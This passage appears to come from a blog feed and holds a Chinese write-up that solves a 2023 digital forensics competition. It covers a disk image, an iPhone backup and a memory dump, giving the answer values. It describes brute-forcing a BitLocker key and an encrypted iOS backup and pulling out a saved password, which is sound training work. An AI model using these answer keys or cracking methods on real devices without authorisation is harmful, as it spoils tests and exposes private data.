&lt;p&gt;通过&lt;code&gt;GetSecurityInfo&lt;/code&gt;、&lt;code&gt;SetSecurityInfo&lt;/code&gt;等 API，可以查询或修改对象的安全描述符&lt;/p&gt;
</description>
        </item>
        <item>
        <title>中科实数杯2023取证总结</title>
        <link>https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</link>
        <pubDate>Wed, 09 Jul 2025 21:17:30 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
        <description>&lt;h1 id=&#34;火眼证据分析&#34;&gt;火眼证据分析
&lt;/h1&gt;&lt;p&gt;火眼证据分析中新建案件，选择镜像文件检材一，打开就会自动创建分析任务进行分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709132752466.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709132752466&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;也可以点击快速分析，选择任务进行分析：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709133222223.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709133222223&#34;
	
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;检材1计算机磁盘镜像&#34;&gt;检材1(计算机磁盘镜像)
&lt;/h1&gt;&lt;h2 id=&#34;1检材一硬盘的-md5-值为多少&#34;&gt;1.检材一硬盘的 MD5 值为多少
&lt;/h2&gt;&lt;p&gt;计算哈希，选择md5&lt;/p&gt;
&lt;p&gt;计算过程需要对加密卷解密（文件 -&amp;gt; 右键加密分区 -&amp;gt; 解密），因此最好先把下一问做完再进行计算：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709144006846.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709144006846&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80518BC0DBF3315F806E9EDF7EE13C12
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2检材一-bitlocker-的恢复密钥是多少&#34;&gt;2.检材一 BitLocker 的恢复密钥是多少
&lt;/h2&gt;&lt;p&gt;使用EFDD，配合检材三给出的的内存镜像爆破：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131041349.png&#34; alt=&#34;image-20250709131041349&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131000961.png&#34; alt=&#34;image-20250709131000961&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;585805-292292-462539-352495-691284-509212-527219-095942
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3检材一镜像中用户最近一次打开的文件名是什么&#34;&gt;3.检材一镜像中用户最近一次打开的文件名是什么
&lt;/h2&gt;&lt;p&gt;依次点击：分析 -&amp;gt; 经典视图 -&amp;gt; 查看最后访问时间&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134325642.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709134325642&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;最后一个文件名称为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;列表.xlsx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4检材一硬盘系统分区的起始位置&#34;&gt;4.检材一硬盘系统分区的起始位置
&lt;/h2&gt;&lt;p&gt;查看系统分区：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134940238.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709134940238&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;分区4是引导加载程序位置，之后的分区六应该才是主系统分区（硬盘分区），起始位置为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;649216
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5检材一系统的版本号是多少格式xxxx&#34;&gt;5.检材一系统的版本号是多少(格式:x.x.x.x)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统信息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709140134139.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709140134139&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里有两个版本号，组合在一起才是题目要求的格式&lt;/p&gt;
&lt;p&gt;在win10和win11中，第二位数字（次要版本号）固定为0：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.0.19042.508
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6检材一回收站中的文件被删除前的路径&#34;&gt;6.检材一回收站中的文件被删除前的路径
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 回收站记录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709141748631.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709141748631&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:/Users/rd/Desktop/iTunes(12.13.0.9).exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7检材一给出最后一次修改系统时间前的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统时间变更 -&amp;gt; 时间变更记录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142136256.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709142136256&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;比对各个更改时间的记录的操作时间，找出最晚操作的时间的原系统时间：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-12 16:37:12
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8检材一最后一次远程连接本机的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS）
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 远程桌面 -&amp;gt; 远程连接过本机的记录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142426055.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709142426055&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;查看连接成功记录，比对最晚的连接时间：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-11 15:57:02
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9检材一-chrome-浏览器最后一次搜索过的关键词是什么&#34;&gt;9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 历史记录 -&amp;gt; 最后访问时间 ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142606570.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709142606570&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;从url里面看出搜索内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;常见的诈骗话术2023
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10检材一是否连接过-u-盘如有请给出-u-盘的-sn-码&#34;&gt;10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; USB最近使用记录 -&amp;gt; 操作时间：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142917357.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709142917357&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;查看接入过的最后一个设备：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FC2005927F271
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11检材一-edge-浏览器最早一次下载过的文件文件名是&#34;&gt;11.检材一 Edge 浏览器最早一次下载过的文件文件名是
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Edge浏览器 -&amp;gt; 下载记录 -&amp;gt; 结束时间倒序：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143212778.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709143212778&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;第一个i4tools8不知道为什么没有时间，但详细条目显示时间晚于winrar：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; winrar-x64-624scp.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12嫌疑人访问的微博的密码的-md5-值&#34;&gt;12.嫌疑人访问的微博的密码的 MD5 值
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 保存的密码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143425660.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709143425660&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;微博密码是&lt;code&gt;!dfrDj*&amp;amp;j98_jUe8&lt;/code&gt;，计算MD5值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5cb42860b3b61ef6dd361ad556f48e05
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材二iphone-备份数据&#34;&gt;检材二(iPhone 备份数据)
&lt;/h1&gt;&lt;h2 id=&#34;13检材二备份的设备名称是什么&#34;&gt;13.检材二备份的设备名称是什么
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 设备信息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709162101944.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709162101944&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;User&amp;#34;的iPhone
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14检材二手机的-ios-系统版本是多少&#34;&gt;14.检材二手机的 iOS 系统版本是多少
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;17.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;15检材二备份的时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-09 15:02:28
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16嫌疑人-iphone-手机给号码13502409024最后一次打电话的时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;16嫌疑人 iPhone 手机给号码&amp;quot;13502409024&amp;quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;当前的备份文件中没有通话记录，其实这个藏在检材一中&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 嵌套证据识别 -&amp;gt; IOS备份：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709171132291.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709171132291&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;给出了一个info.plist文件的地址，但他只是配置文件，我们需要回到上层目录，导出完整备份文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709171433124.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709171433124&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;同时，我们也能把它添加为新检材，扫描过程中会发现这是加密后的文件，需要密码&lt;/p&gt;
&lt;p&gt;使用Passware Kit Forensic爆破，这里需要爆破的文件是Manifest.plist，从后文（22题）知道是五位数密码&lt;/p&gt;
&lt;p&gt;选择Customize Settings高级设置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173210769.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709173210769&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;只保留brute-force，修改成五位数字：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173334793.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709173334793&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;爆破：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173141338.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709173141338&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;输入密码后继续分析，分析完成后刷新一下，就会多出新的检材分析结果了&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 通话记录 -&amp;gt; 时间：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172024138.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709172024138&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-04 13:18:50
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;17检材二使用过的号码-iccid-是多少&#34;&gt;17.检材二使用过的号码 ICCID 是多少
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;89860000191997734908
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;18检材二手机中高德地图最后搜索的地址&#34;&gt;18.检材二手机中高德地图最后搜索的地址
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 高德地图 -&amp;gt; 搜索点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709170611265.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709170611265&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 双山大道3号
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;19检材二手机最后一次登陆注册hotscoin的时间是格式-yyyy-mm-ddhhmmss&#34;&gt;19.检材二手机最后一次登陆/注册&amp;quot;HotsCoin&amp;quot;的时间是(格式: YYYY-MM-DDHH:MM:SS)
&lt;/h2&gt;&lt;p&gt;HotsCoin是数字交易平台，从短信中能得到登录时间&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 短信：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172344826.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709172344826&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-04 13:28:14
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;20检材二手机中照片img_0002的拍摄时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;20.检材二手机中照片&amp;quot;IMG_0002&amp;quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 图片 -&amp;gt; IMG_0002：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172828523.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709172828523&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-06 11:08:30
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21检材二中小西米语音-app-的bundle-id是什么&#34;&gt;21.检材二中&amp;quot;小西米语音&amp;quot; app 的Bundle ID是什么
&lt;/h2&gt;&lt;p&gt;Bundle ID是iOS应用唯一标识符，也就是包名&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 应用列表 -&amp;gt; 搜索小西米语音：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173624166.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709173624166&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.titashow.tangliao
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22检材二中浏览器最后一次搜索的关键词是什么&#34;&gt;22.检材二中浏览器最后一次搜索的关键词是什么
&lt;/h2&gt;&lt;p&gt;浏览器不是uc浏览器，指的是safari&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; Safari -&amp;gt; 搜索历史：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173822647.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709173822647&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ios备份密码忘了怎么办 五位纯数字
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里也就是在提示前面的加密备份文件的密码&lt;/p&gt;
&lt;h2 id=&#34;23嫌疑人和洗钱人员约定电子钱包的品牌是什么-如有多个用顿号分隔&#34;&gt;23.嫌疑人和洗钱人员约定电子钱包的品牌是什么, 如有多个用顿号分隔
&lt;/h2&gt;&lt;p&gt;微信聊天记录和信息里都没有相关信息，其他应用里面只有小西米语音有可能了&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 其他应用 -&amp;gt; 小西米语音 -&amp;gt; 在线连麦平台 -&amp;gt; 文件分类 -&amp;gt; SQLite 文件&lt;/p&gt;
&lt;p&gt;其他应用是耗时分析，火眼不会自动分析，需要手动进行选择分析&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本来应该是有im5db这个数据库的，我的分析结果里面没有，其他六个都有，也许是因为后缀的原因？&lt;/p&gt;
&lt;p&gt;所以直接沿着下面这个路径找了：&lt;/p&gt;
&lt;p&gt;/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522/im5db&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;查看message表的content字段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709180909839.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709180909839&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;imToken、Bitcoin
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;24嫌疑人和洗钱人员约定电子钱包的金额比例是什么&#34;&gt;24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么
&lt;/h2&gt;&lt;p&gt;同上题图：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0.2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材三计算机内存镜像&#34;&gt;检材三(计算机内存镜像)
&lt;/h1&gt;&lt;h2 id=&#34;25检材三中进程ftk-imagerexe的-pid-是多少&#34;&gt;25.检材三中进程&amp;quot;FTK Imager.exe&amp;quot;的 PID 是多少
&lt;/h2&gt;&lt;p&gt;不知道为什么我的volatility2不能分析出win10的结果，只好使用volatility3：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195208579.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709195208579&#34;
	
	
&gt;&lt;/p&gt;
